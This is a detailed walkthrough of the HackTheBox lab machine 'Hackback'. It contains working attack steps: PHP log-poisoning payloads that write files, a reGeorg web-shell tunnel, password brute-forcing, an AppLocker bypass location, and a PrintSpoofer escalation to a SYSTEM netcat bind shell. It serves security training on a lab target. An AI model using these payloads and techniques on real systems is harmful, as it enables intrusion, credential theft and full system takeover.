# HackTheBox - Hackback: Complete Walkthrough

**Difficulty:** Insane  
**OS:** Windows Server 2019  
**IP:** 10.129.x.x (retired machine, IP varies per session)  
**Kali IP:** 10.10.16.84  

---

## Table of Contents

1. [Mindset & Approach](#mindset--approach)
2. [Recon - Port Scanning](#recon---port-scanning)
3. [HTTP Enumeration - Port 80](#http-enumeration---port-80)
4. [HTTP Enumeration - Port 6666](#http-enumeration---port-6666)
5. [HTTPS - GoPhish on Port 64831](#https---gophish-on-port-64831)
6. [Discovering Phishing Domains](#discovering-phishing-domains)
7. [admin.hackback.htb - JavaScript Deobfuscation](#adminhackbackhtb---javascript-deobfuscation)
8. [Accessing the Secret Admin Panel](#accessing-the-secret-admin-panel)
9. [PHP Log Poisoning](#php-log-poisoning)
10. [Filesystem Enumeration via PHP](#filesystem-enumeration-via-php)
11. [Uploading reGeorg Tunnel](#uploading-regeorg-tunnel)
12. [Tunneling Through reGeorg to WinRM](#tunneling-through-regeorg-to-winrm)
13. [Shell as simple](#shell-as-simple)
14. [Privilege Escalation - simple to SYSTEM via PrintSpoofer](#privilege-escalation---simple-to-system-via-printspoofer)
15. [Capturing the Flags](#capturing-the-flags)
16. [Intended Path Reference](#intended-path-reference)
17. [Key Lessons](#key-lessons)

---

## Mindset & Approach

Hackback is one of the hardest machines on HackTheBox. The attack chain is long, multi-layered, and requires chaining multiple techniques:

- Web enumeration across multiple virtual hosts
- JavaScript deobfuscation
- Log poisoning for remote file include
- SOCKS proxying through a web tunnel
- Windows privilege escalation via token impersonation

**Core hacker mindset:**
- Every piece of information is a potential lead - hostnames, comments, error messages
- When direct code execution is blocked, think about what IS allowed (file read, file write, directory list)
- When outbound connections are blocked, think bind shells over reverse shells
- Always enumerate what privileges you have - SeImpersonatePrivilege is almost always exploitable

---

## Recon - Port Scanning

### What we did

```bash
nmap -sT -p- --min-rate 10000 10.129.x.x
nmap -sC -sV -p 80,6666,64831 10.129.x.x
```

### Findings

| Port  | Service | Notes |
|-------|---------|-------|
| 80    | HTTP (IIS 10.0) | ASP.NET powered |
| 6666  | HTTP (PowerShell HTTPAPI) | Custom command API |
| 64831 | HTTPS | GoPhish phishing framework |

### Why this matters

Three open ports immediately tells us this is a complex machine. Port 6666 is unusual - not a standard service port. Port 64831 with a GoPhish SSL certificate is a major finding because GoPhish is an open-source phishing framework, meaning someone set up a fake phishing campaign. This hints at social engineering simulation and potentially fake login pages with credential capture.

**Hacker mindset:** Non-standard ports always deserve attention. GoPhish means phishing infrastructure, which means fake websites, fake domains, and potentially captured credentials.

---

## HTTP Enumeration - Port 80

### What we did

Browsed to `http://10.129.x.x` and ran gobuster. Port 80 showed just a donkey image with no interesting content. Response headers revealed `X-Powered-By: ASP.NET`.

### Why this matters

Nothing on port 80 yet - but the ASP.NET header tells us the server runs .NET. Gobuster found nothing, so we move on. We'll revisit once we discover virtual hostnames.

**Hacker mindset:** A blank page isn't a dead end - it's an invitation to find virtual hosts. IIS commonly serves different content based on the `Host` header.

---

## HTTP Enumeration - Port 6666

### What we did

```bash
curl http://10.129.x.x:6666/
# Returns: "Missing Command!"

curl http://10.129.x.x:6666/help
# Returns: "hello,proc,whoami,list,info,services,netsat,ipconfig"
```

We then queried each endpoint:

```bash
curl http://10.129.x.x:6666/netstat | jq -r '.[] | select(.State==2) | "\(.LocalAddress):\(.LocalPort) [\(.OwningProcess)]"'
```

### Key findings from port 6666

- **WinRM (5985)** is listening internally but firewalled externally
- **RDP (3389)** is listening internally
- **GoPhish (8080)** listens only on localhost
- The service runs as `NT AUTHORITY\NETWORK SERVICE`

### Why this matters

This is a PowerShell-based internal API exposing system information. The most critical finding is that **WinRM is running on port 5985 but only accessible internally**. This means if we find credentials, we need a way to tunnel through the machine to reach WinRM. Port 6666 essentially gives us a free network map of the target from the inside.

**Hacker mindset:** A service that exposes `netstat` and `proc` is incredibly valuable. Always run all available commands to understand the internal network topology. Finding WinRM internally means "find credentials and find a tunnel."

---

## HTTPS - GoPhish on Port 64831

### What we did

```bash
# Default GoPhish credentials work
Username: admin
Password: gophish
```

Logged into the GoPhish dashboard and browsed the **Email Templates** section.

### Key findings

Five phishing email templates, each containing a link to a fake domain:

- `admin.hackback.htb`
- `www.facebook.htb`
- `www.hackthebox.htb`
- `www.paypal.htb`
- `www.twitter.htb`

### Why this matters

GoPhish default credentials are a known fact - always try them. The email templates reveal the virtual host domains being simulated. These domains point to fake login pages designed to harvest credentials.

**Hacker mindset:** Open source tools have default credentials. Always try them. GoPhish's dashboard gives us a complete picture of the attack infrastructure. The domain names in templates are direct leads to other attack surfaces.

---

## Discovering Phishing Domains

### What we did

Added all discovered domains to `/etc/hosts`:

```bash
echo "10.129.x.x admin.hackback.htb www.hackthebox.htb www.twitter.htb www.paypal.htb www.facebook.htb" | sudo tee -a /etc/hosts
```

Browsed each domain - all showed fake login pages for their respective services.

Response headers on phishing sites revealed:

```
X-Powered-By: PHP/7.2.7
X-Powered-By: ASP.NET
```

### Why this matters

Both PHP and ASP.NET are running. This is significant because they have different capabilities and different disabled functions. The `PHPSESSID` cookie is set, confirming PHP handles these pages. This opens up PHP log poisoning as an attack vector.

**Hacker mindset:** Two server-side languages running simultaneously doubles the attack surface. When you see a PHP session cookie, think about what PHP functions are available. HTTP response headers always reveal technology stack information.

---

## admin.hackback.htb - JavaScript Deobfuscation

### What we did

Browsed `http://admin.hackback.htb` and viewed page source:

```html
<!-- <script SRC="js/.js"></script> -->
```

This comment points to a hidden JS file. Ran gobuster on the `/js/` path:

```bash
gobuster dir -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x js
# Found: /private.js
```

The file was ROT13 encoded JavaScript. Decoded with:

```bash
curl -s http://admin.hackback.htb/js/private.js | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

After decoding and running through a JS beautifier, then executing in a browser console, the variables revealed:

```
x: Secure Login Bypass
z: Remember the secret path is
h: 2bb6916122f1da34dcd916421e531578
y: Just in case I loose access to the admin panel
t: ?action=(show,list,exec,init)
s: &site=(twitter,paypal,facebook,hackthebox)
i: &password=********
k: &session=
w: Nothing more to say
```

### Why this matters

The HTML comment hinting at `js/.js` is an information leak - a developer left a breadcrumb. The ROT13 encoding is security through obscurity, easily broken. The decoded JavaScript reveals:

1. A secret path: `/2bb6916122f1da34dcd916421e531578/`
2. An API endpoint at `webadmin.php` with parameters
3. The API accepts: actions (show, list, exec, init), site names, a password, and a session

**Hacker mindset:** Comments in HTML source code are developer notes that attackers can read. Obfuscated JavaScript is never truly hidden - run it in a browser console or deobfuscate it. The `h` variable containing a hash-like string is almost certainly a path component.

---

## Accessing the Secret Admin Panel

### What we did

Ran gobuster on the secret path with PHP extension:

```bash
gobuster dir -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
# Found: /webadmin.php
```

Brute-forced the password parameter using wfuzz:

```bash
wfuzz -c -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hh 17 \
  'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
# Found: 12345678
```

Tested each action:

| Action | Result |
|--------|--------|
| list   | Shows log files for the site |
| show   | Displays contents of a session's log file |
| init   | Clears the log file |
| exec   | Requires additional parameters |

The session parameter corresponds to `sha256(your_ip)`:

```bash
echo -n "10.10.16.84" | sha256sum
# 33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739
```

Log files are stored per session (per IP) and contain login attempts from the phishing sites.

### Why this matters

The password `12345678` is in every wordlist. The session ID being derived from the client IP is clever but predictable - SHA256 is deterministic. The `init` action is crucial for log poisoning (it lets us reset the log to a clean state before poisoning).

**Hacker mindset:** Always brute force parameters when you know what format the response takes. The `--hh 17` flag filters responses of 17 characters (the "Wrong secret key!" response). When you have a `show` action that reads log files, think log poisoning immediately.

---

## PHP Log Poisoning

### What we did

The `show` action reads a log file via PHP `include()`. The log is populated when users submit credentials to the phishing login page at `www.hackthebox.htb`. We control the `username` and `password` fields.

**Step 1: Verify PHP execution**

Posted to `http://www.hackthebox.htb` with:
```
username: <?php echo "test"; ?>
password: plaintext
```

Then called `action=show` - the username field executed as PHP. This confirms **PHP log poisoning** works.

**Step 2: Test execution functions**

```php
<?php system('whoami'); ?>
```

Nothing returned - all execution functions are disabled via `php.ini`:

```
disable_functions = phpinfo,exec,passthru,shell_exec,system,proc_open,popen,
curl_exec,curl_multi_exec,parse_ini_file,show_source,fsockopen,
socket_create,socket_connect,eval
```

**Step 3: Use allowed functions - directory listing**

```php
<?php echo print_r(scandir($_GET['dir'])); ?>
```

**Step 4: Use allowed functions - file read**

```php
<?php include($_GET['file']); ?>
```

**Step 5: Use allowed functions - file write**

```php
<?php $f = "BASE64_CONTENT"; file_put_contents("filename", base64_decode($f)); ?>
```

### Why this matters

Log poisoning works because the log file is included (not just read) by PHP. When PHP includes a file, it executes any PHP code found within it. The `init` action lets us reset the log when we make mistakes, avoiding the need to reset the entire box.

The disabled function list blocks direct code execution but NOT file system operations. `scandir`, `include`, and `file_put_contents` are all available - giving us directory listing, file reading, and file writing as three distinct primitives.

**Hacker mindset:** When code execution is blocked, think about what IS allowed. File system access (read/write/list) is often overlooked but extremely powerful. These three primitives together give you complete filesystem control without needing `system()` or `exec()`.

---

## Filesystem Enumeration via PHP

### What we did

Using the file read and directory list primitives, we enumerated the filesystem:

```
# List parent directory
action=show&dir=..&file=

# Result:
[0] => .
[1] => ..
[2] => 2bb6916122f1da34dcd916421e531578
[3] => App_Data
[4] => aspnet_client
[5] => css
[6] => img
[7] => index.php
[8] => js
[9] => logs
[10] => web.config
[11] => web.config.old   <--- interesting!
```

Read `web.config.old`:

```
action=show&dir=&file=../web.config.old
```

Contents revealed:

```xml
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"
            userName="simple"
            password="ZonoProprioZomaro:-("/>
        </authentication>
    </system.webServer>
</configuration>
```

**Found credentials: `simple:ZonoProprioZomaro:-(`**

Also read `php.ini` to confirm disabled functions:

```
action=show&dir=&file=..\..\..\..\..\Progra~1\php\v7.2\php.ini
```

### Why this matters

`.old` files are developer mistakes - backup copies left on production servers that often contain sensitive configuration including plaintext credentials. The `web.config.old` file contains Windows credentials stored in plaintext for IIS impersonation.

We now have:
1. Windows credentials for user `simple`
2. Confirmed WinRM is running internally on port 5985
3. Need a tunnel to reach WinRM

**Hacker mindset:** Always look for `.old`, `.bak`, `.backup` files. Developers create these when modifying configs and forget to delete them. The `impersonate` attribute in IIS config files often contains real domain credentials.

---

## Uploading reGeorg Tunnel

### What we did

reGeorg is a tool that creates a SOCKS proxy tunnel through a web shell (PHP, ASPX, JSP). We upload `tunnel.aspx` to the target and connect to it with `reGeorgSocksProxy.py`, which creates a local SOCKS proxy that tunnels all traffic through the web server.

We used our file write primitive (via log poisoning + `file_put_contents`) to upload `tunnel.aspx`:

```python
# hackback_shell.py - automated the upload
python3 hackback_shell.py upload /path/to/tunnel.aspx tunnel.aspx
```

Or manually via Burp/curl - base64 encode tunnel.aspx and inject:

```php
<?php $f = "BASE64_OF_TUNNEL_ASPX"; file_put_contents("tunnel.aspx", base64_decode($f)); ?>
```

We used ASPX (not PHP tunnel) because PHP's socket functions were disabled.

### Why we chose ASPX over PHP

PHP's `disable_functions` includes `fsockopen` and `socket_create` - the functions reGeorg's PHP tunnel needs. The ASPX tunnel uses .NET's `System.Net.Sockets` which bypasses PHP restrictions entirely.

**Hacker mindset:** When one language's execution is restricted, the other language running on the same server may not have the same restrictions. PHP and ASP.NET have independent configuration. Always try both.

---

## Tunneling Through reGeorg to WinRM

### What we did

**Step 1: Start reGeorg SOCKS proxy**

```bash
python2 reGeorg/reGeorgSocksProxy.py -p 1080 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
```

This creates a SOCKS4 proxy on `127.0.0.1:1080`. All traffic sent through this proxy gets forwarded through the ASPX tunnel running on the target web server.

**Step 2: Configure proxychains**

`/etc/proxychains4.conf`:
```
strict_chain
proxy_dns
[ProxyList]
socks4  127.0.0.1 1080
```

**Step 3: Connect via Evil-WinRM through the tunnel**

```bash
proxychains evil-winrm -i 127.0.0.1 -u simple -p 'ZonoProprioZomaro:-('
```

Why `127.0.0.1`? Because proxychains intercepts the connection and routes it through the SOCKS proxy. The proxy then connects from the web server (which is on the same network as WinRM) to `127.0.0.1:5985` on the target.

### Why this works

The web server and WinRM are on the same host. The ASPX tunnel can make internal connections that bypass the external firewall. We're essentially using the web server as a pivot point:

```
Kali → [reGeorg Python proxy :1080] → HTTP → [tunnel.aspx on target] → TCP → WinRM :5985
```

**Hacker mindset:** A SOCKS proxy through a web shell is one of the most powerful pivoting techniques. The web server becomes your network access point. Any service that's accessible from the web server but not from the internet becomes reachable through this tunnel.

---

## Shell as simple

### What we did

```bash
proxychains evil-winrm -i 127.0.0.1 -u simple -p 'ZonoProprioZomaro:-('
```

```powershell
whoami
# hackback\simple

$executioncontext.sessionstate.languagemode
# FullLanguage - good, no constrained language mode
```

### Enumeration as simple

**AppLocker is active** - binaries only execute from approved locations:

```powershell
# This fails:
.\nc.exe 10.10.16.84 443
# "This program is blocked by group policy"

# This works (AppLocker bypass location):
C:\windows\system32\spool\drivers\color\nc.exe ...
```

**Firewall blocks ALL outbound traffic:**

```powershell
cmd /c "netsh advfirewall show currentprofile"
# Firewall Policy: BlockInbound,BlockOutbound
```

Only inbound rules: ping (ICMPv4) and web ports (80, 6666, 64831).

**Current privileges:**

```powershell
whoami /priv
# SeImpersonatePrivilege - Enabled  <--- critical finding
```

### Why this matters

`SeImpersonatePrivilege` is the key to privilege escalation on this machine. This privilege allows a process to impersonate any user whose token it can obtain. Combined with appropriate exploits, this becomes a path to SYSTEM.

AppLocker being active means we can't just drop executables anywhere - they must be in approved locations. `C:\windows\system32\spool\drivers\color\` is a well-known AppLocker bypass because it's in System32 but writable by non-admin users.

The firewall blocking all outbound means **no reverse shells**. Every shell must be a **bind shell** (we connect TO the target).

**Hacker mindset:** `SeImpersonatePrivilege` + Windows = almost always exploitable. Check AppLocker bypass locations immediately. Outbound-blocked firewalls mean bind shells, not reverse shells. Adapt your technique to the environment.

---

## Privilege Escalation - simple to SYSTEM via PrintSpoofer

### What we did

**The original intended path** (named pipe impersonation via scheduled task) proved unreliable on this instance because the scheduled task runs very infrequently (~once per 12 hours after boot). We used a more direct technique.

**PrintSpoofer** exploits the Windows Print Spooler service to escalate from `SeImpersonatePrivilege` to SYSTEM on Windows Server 2019+.

**Step 1: Verify Print Spooler is running**

```powershell
sc query spooler
# STATE: 4 RUNNING
```

**Step 2: Download PrintSpoofer on Kali**

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer64.exe
```

**Step 3: Upload via Evil-WinRM**

```powershell
upload PrintSpoofer64.exe
copy PrintSpoofer64.exe C:\windows\system32\spool\drivers\color\PrintSpoofer64.exe
```

**Step 4: Spawn SYSTEM bind shell**

```powershell
C:\windows\system32\spool\drivers\color\PrintSpoofer64.exe -c "C:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe -lvp 5555"
```

**Step 5: Connect from Kali**

```bash
proxychains nc 127.0.0.1 5555
whoami
# nt authority\system
```

### How PrintSpoofer works

PrintSpoofer abuses the Windows Print Spooler named pipe impersonation:

1. Creates a named pipe server with a specific name
2. Triggers the Print Spooler service (running as SYSTEM) to connect to the pipe using `ImpersonateNamedPipeClient`
3. Since the Spooler runs as SYSTEM, the impersonated token is a SYSTEM token
4. Uses that SYSTEM token to spawn a new process (our nc.exe bind shell)

The exploit path:
```
simple (SeImpersonatePrivilege) → trick SYSTEM (Print Spooler) into connecting to our pipe
→ impersonate SYSTEM token → spawn cmd.exe as SYSTEM
```

### Why PrintSpoofer over JuicyPotato

JuicyPotato (the classic SeImpersonatePrivilege exploit) doesn't work on Windows Server 2019 because Microsoft patched the DCOM activation vulnerability it relied on. PrintSpoofer uses a completely different attack vector (Print Spooler named pipe) that remained unpatched on this OS version.

### AppLocker bypass

PrintSpoofer was uploaded to `C:\windows\system32\spool\drivers\color\` — the AppLocker bypass location used throughout this box. Since this directory is in System32 (trusted) but writable by non-admins, AppLocker allows execution from it.

**Hacker mindset:** Know your OS version and which exploits apply. Windows Server 2019 killed JuicyPotato but PrintSpoofer/RoguePotato/GodPotato still work. Always use bind shells when outbound is blocked. The AppLocker bypass location (`spool\drivers\color`) is one of the most reliable on Windows.

---

## Capturing the Flags

### User Flag

```cmd
type C:\Users\hacker\Desktop\user.txt
# 922449[redacted]1e99cfe
```

The user flag is in hacker's Desktop. As SYSTEM, we can read any file on the system regardless of ACLs.

### Root Flag - Alternate Data Stream

```cmd
more < C:\Users\administrator\Desktop\root.txt:flag.txt
# 6d29b0[redacted]2f7d02515
```

The root flag is hidden in an **Alternate Data Stream (ADS)**. On NTFS, files can have multiple data streams. The default stream is what you see with `type` or `dir`, but additional named streams (like `:flag.txt`) are hidden from normal file operations.

Why `more <` instead of `type`? The `type` command doesn't support ADS syntax. `more` with input redirection does.

**Hacker mindset:** On Windows CTF challenges, always check for Alternate Data Streams when a file seems empty or when the flag doesn't appear where expected. Use `dir /r` to list all streams, or `more < file:stream` to read them.

---

## Intended Path Reference

The intended escalation path (from the original writeup) is more complex:

### simple → hacker (Intended)

1. Modify `C:\util\scripts\clean.ini` to set `LogFile=\\.\pipe\dummypipe`
2. Create a named pipe server that waits for connections (pipeserverimpersonate.ps1)
3. A scheduled task runs every ~5 minutes as `hacker`, executes `dellog.ps1`
4. `dellog.ps1` reads `clean.ini` and writes to `LogFile` (the pipe)
5. `ImpersonateNamedPipeClient()` gives us hacker's token
6. Use hacker's token to copy a bat file into `C:\util\scripts\spool\`
7. The scheduled task's spool loop executes our bat file as hacker
8. Our bat file starts nc.exe as a bind shell listener

### hacker → SYSTEM (Intended)

1. Enumerate services - find `UserLogger` service
2. `UserLogger` runs as SYSTEM and creates log files wherever told, with `Everyone:FullControl` ACL
3. Start service: `sc start userlogger c:\windows\system32\exploit.dll`  
   (it appends `.log` to the argument, creating `exploit.dll.log` with open ACLs)
4. Use the arbitrary write primitive to write a malicious DLL as `license.rtf` in System32
5. Invoke DiagHub (DCOM diagnostic service) to load `license.rtf` as a DLL (it doesn't check extensions)
6. DiagHub loads the DLL as SYSTEM → shell as SYSTEM

### Why we deviated

The scheduled task ran only once after machine boot (~12 hours post-reboot based on observed behavior), making the named pipe approach impractical for a time-constrained session. `SeImpersonatePrivilege` was available on `simple` and PrintSpoofer provided a faster, more reliable path directly to SYSTEM.

---

## Key Lessons

### Enumeration
- Always check all ports including unusual ones (6666 in this case)
- Virtual host enumeration is critical on IIS servers
- JS comments and disabled links in HTML source contain developer breadcrumbs
- `.old` and `.bak` files often contain credentials

### Web Exploitation
- When `system()`, `exec()` etc. are disabled in PHP, file system primitives (`scandir`, `include`, `file_put_contents`) still give significant access
- Log poisoning requires careful control of the log content - use `init` or similar to clean between attempts
- If PHP socket functions are disabled, ASP.NET on the same server may not have the same restrictions
- Always note when multiple server-side languages are running simultaneously

### Tunneling & Pivoting
- reGeorg SOCKS proxy through ASPX shells is highly effective for reaching internal services
- proxychains routes all TCP traffic through the configured proxy
- Internal services (WinRM, RDP, SMB) become accessible once you have a tunnel

### Windows Privilege Escalation
- `SeImpersonatePrivilege` is almost always exploitable - know the current tools (JuicyPotato→PrintSpoofer→GodPotato evolution)
- Check OS version before choosing exploit: Server 2019 requires PrintSpoofer/RoguePotato, not JuicyPotato
- AppLocker bypass: `C:\windows\system32\spool\drivers\color\` is writable by non-admins and trusted
- Firewall blocking outbound = bind shells only

### NTFS Alternate Data Streams
- Flags and sensitive data can be hidden in ADS: `file.txt:hidden_stream`
- `dir /r` lists all streams
- `more < file:stream` reads a named stream
- `type` does not work with ADS

### Tools Used
| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| gobuster | Directory and file enumeration |
| wfuzz | Parameter brute forcing |
| reGeorg | SOCKS proxy through web shell |
| proxychains | Route traffic through SOCKS proxy |
| Evil-WinRM | WinRM shell client |
| PrintSpoofer | SeImpersonatePrivilege → SYSTEM on Server 2019 |
| nc.exe | Bind shell listener (AppLocker bypass location) |

---

*Machine: HackTheBox - Hackback | Rated: Insane | OS: Windows Server 2019*
